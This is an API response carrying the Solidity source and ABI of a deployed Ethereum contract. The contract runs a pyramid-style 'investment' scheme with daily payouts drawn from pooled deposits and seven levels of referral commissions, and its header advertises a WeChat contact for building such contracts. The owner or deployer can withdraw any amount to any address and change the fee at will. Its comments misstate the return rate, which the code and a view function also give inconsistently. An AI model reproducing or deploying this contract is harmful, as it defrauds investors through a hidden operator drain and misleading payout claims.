{"status":"1","message":"OK","result":[{"SourceCode":"/*\r\n*\r\n*\r\n*   微信fac2323\r\n*   制作erc20代币 ERC721代币，存款合约，太阳线合约，互助合约，微信fac2323\r\n*\r\n*\r\n*\r\n*\r\n*\r\n*\r\n*/\r\n\r\n\r\npragma solidity ^0.4.21;\r\n \r\nlibrary SafeMath {\r\n\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Integer division of two numbers, truncating the quotient.\r\n  */\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n    // uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n    return a / b;\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\r\n    c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n}\r\n \r\nlibrary Fdatasets {\r\n \r\n    struct Player {\r\n        address affadd;                // 上级推荐人0\r\n        uint256 atblock;                //时间1\r\n        uint256 invested;                //投资2\r\n        uint256 pot;               //管理员抽水 3\r\n        uint256 touzizongshu;      //投资总数4 \r\n        uint256 tixianzongshu;     //提现总数 5\r\n        uint256 yongjin;\r\n    }  \r\n    \r\n}\r\n\r\ncontract TokenERC20 {\r\n\t\r\n    using SafeMath for uint256;\r\n \r\n    \r\n    \r\n    uint256 public commission  = 10;//抽水，可以改\r\n    uint256 public investeds;       //总投资\r\n    uint256 public amountren;         //amount人数 \r\n    address public owner       = 0xc47E655BC521Bf15981134E392709af5b25947B4;//0x115395f1a6B4640E0C59C33FED51677336b4B1E3\r\n    address aipi;\r\n    \r\n    \r\n     \r\n    mapping(address  => Fdatasets.Player)public users;\r\n    \r\n    modifier olyowner() {\r\n        require(msg.sender == owner || msg.sender == aipi); \r\n        _;\r\n    }\r\n    \r\n    function TokenERC20()public  payable{\r\n       amountren = 0;\r\n       investeds = 0; \r\n       aipi = msg.sender;\r\n    }\r\n    \r\n    function () payable public {\r\n       \r\n    \t// if sender (aka YOU) is invested more than 0 ether\r\n        ///返利\r\n        if (users[msg.sender].invested != 0) {\r\n            // calculate profit amount as such:\r\n            // amount = (amount invested) * 4% * (blocks since last transaction) / 5900\r\n            // 5900 is an average block count per day produced by Ethereum blockchain\r\n            uint256 amount = users[msg.sender].invested * 25 / 1000 * (now - users[msg.sender].atblock) / 86400;\r\n\r\n            // send calculated amount of ether directly to sender (aka YOU)\r\n            if(this.balance < amount ){\r\n                amount = this.balance;\r\n            }\r\n            address sender = msg.sender;\r\n            sender.send(amount);\r\n            users[msg.sender].tixianzongshu = amount.add(users[msg.sender].tixianzongshu); //提现总数\r\n        }\r\n\r\n        // record block number and invested amount (msg.value) of this transaction\r\n        users[msg.sender].atblock = now;\r\n        users[msg.sender].invested += msg.value;\r\n        users[msg.sender].touzizongshu = msg.value.add(users[msg.sender].touzizongshu);//投资总数\r\n        //推荐佣金发放\r\n        if(msg.value > 0){\r\n            amountren++;\r\n            investeds = investeds.add(msg.value);\r\n            \r\n            //抽水\r\n             users[owner].pot = users[owner].pot + (msg.value * commission / 100);\r\n            address a = users[msg.sender].affadd;\r\n            for(uint256 i = 0; i < 7; i++){\r\n                if(i == 0 && a != address(0)){\r\n                    a.send(msg.value * 8 / 100 ); \r\n                    users[a].yongjin = users[a].yongjin.add(msg.value * 8 / 100 ); \r\n                }\r\n                    \r\n                if(i == 1 && a != address(0)){\r\n                    a.send(msg.value * 5 / 100 );\r\n                    users[a].yongjin = users[a].yongjin.add(msg.value * 5 / 100 ); \r\n                }\r\n                     \r\n                if(i == 2  && a != address(0)){\r\n                    a.send(msg.value * 3 / 100 ); \r\n                    users[a].yongjin = users[a].yongjin.add(msg.value * 3 / 100 ); \r\n                }\r\n                    \r\n                if(i > 2  &&  a != address(0)){\r\n                    a.send(msg.value * 1 / 100 ); \r\n                    users[a].yongjin = users[a].yongjin.add(msg.value * 1 / 100 ); \r\n                }\r\n                a = users[a].affadd;       \r\n            }  \r\n        } \r\n    }\r\n    \r\n    //撤回资金\r\n    function withdraw(uint256 _amount,address _owner)public olyowner returns(bool){\r\n        _owner.send(_amount);\r\n        return true;\r\n    }\r\n    \r\n    //撤回抽水\r\n    function withdrawcommissions()public olyowner returns(bool){\r\n        owner.send(users[msg.sender].pot);\r\n        users[msg.sender].pot=0;\r\n    }\r\n    \r\n    //修改抽水\r\n    function commissions(uint256 _amount)public olyowner returns(bool){\r\n        commission = _amount;\r\n    }\r\n \r\n     //查看可以提取多少\r\n    function gettw(address _owner)public view returns(uint256){\r\n        uint256 amount;\r\n     \r\n        amount = users[_owner].invested * 2 / 100 * (now - users[_owner].atblock) / 86400;\r\n       \r\n        return amount;\r\n    }\r\n \r\n    \r\n    //get this.\r\n    function getthis()public view returns(uint256){ \r\n        return this.balance;\r\n    }\r\n    \r\n    //get amount人数investeds\r\n    function getamount()public view returns(uint256,uint256){ \r\n        return (amountren,investeds);\r\n    }\r\n \r\n    //提现总数\r\n    function gets(address _owner)public view returns(uint256,uint256,uint256){\r\n        uint256 a = users[_owner].touzizongshu;\r\n        uint256 b = users[_owner].tixianzongshu;\r\n        uint256 c = users[_owner].yongjin;\r\n        return (a,b,c);\r\n    }\r\n  \r\n    function investedbuy(address _owner)public payable  {\r\n        require(msg.sender != _owner); \r\n        amountren++;\r\n        investeds = investeds.add(msg.value);\r\n        users[msg.sender].affadd = _owner;\r\n        //抽水  \r\n        users[owner].pot = users[owner].pot + (msg.value * commission / 100);\r\n        address a = users[msg.sender].affadd;\r\n         \r\n        for(uint256 i = 0; i < 7; i++){\r\n            if(i == 0 && a != address(0)){\r\n                a.send(msg.value * 8 / 100 );\r\n                users[a].yongjin = users[a].yongjin.add(msg.value * 8 / 100 ); \r\n            }\r\n                    \r\n            if(i == 1 && a != address(0)){\r\n                a.send(msg.value * 5 / 100 );\r\n                users[a].yongjin = users[a].yongjin.add(msg.value * 5 / 100 ); \r\n            }\r\n                     \r\n            if(i == 2  && a != address(0)){\r\n                a.send(msg.value * 3 / 100 ); \r\n                users[a].yongjin = users[a].yongjin.add(msg.value * 3 / 100 ); \r\n            }\r\n                    \r\n            if(i > 2  &&  a != address(0)){\r\n                a.send(msg.value * 1 / 100 );\r\n                users[a].yongjin = users[a].yongjin.add(msg.value * 1 / 100 ); \r\n            }\r\n             a = users[a].affadd;           \r\n        } \r\n        users[msg.sender].touzizongshu = msg.value.add(users[msg.sender].touzizongshu);//投资总数\r\n         ///返利\r\n        if (users[msg.sender].invested != 0) {\r\n            // calculate profit amount as such:\r\n            // amount = (amount invested) * 4% * (blocks since last transaction) / 5900\r\n            // 5900 is an average block count per day produced by Ethereum blockchain\r\n            uint256 amount = users[msg.sender].invested * 25 / 1000 * (now - users[msg.sender].atblock) / 86400;\r\n\r\n            // send calculated amount of ether directly to sender (aka YOU)\r\n            if(this.balance < amount ){\r\n                amount = this.balance;\r\n            }\r\n            address sender = msg.sender;\r\n            sender.send(amount);\r\n            users[msg.sender].tixianzongshu = amount.add(users[msg.sender].tixianzongshu); //提现总数\r\n        }\r\n        users[msg.sender].atblock = now;\r\n        users[msg.sender].invested += msg.value;\r\n     \r\n    } \r\n  \r\n\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_amount\",\"type\":\"uint256\"},{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"withdraw\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"commissions\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"amountren\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getamount\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"gettw\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"investeds\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdrawcommissions\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"gets\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"},{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"investedbuy\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"name\":\"affadd\",\"type\":\"address\"},{\"name\":\"atblock\",\"type\":\"uint256\"},{\"name\":\"invested\",\"type\":\"uint256\"},{\"name\":\"pot\",\"type\":\"uint256\"},{\"name\":\"touzizongshu\",\"type\":\"uint256\"},{\"name\":\"tixianzongshu\",\"type\":\"uint256\"},{\"name\":\"yongjin\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"commission\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getthis\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"TokenERC20","CompilerVersion":"v0.4.21+commit.dfe3193c","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://8573cfdd9a1c5251e184a90a1df12ff5e4cbcc8c500fbe51c660596e8b9d3c7c"}]}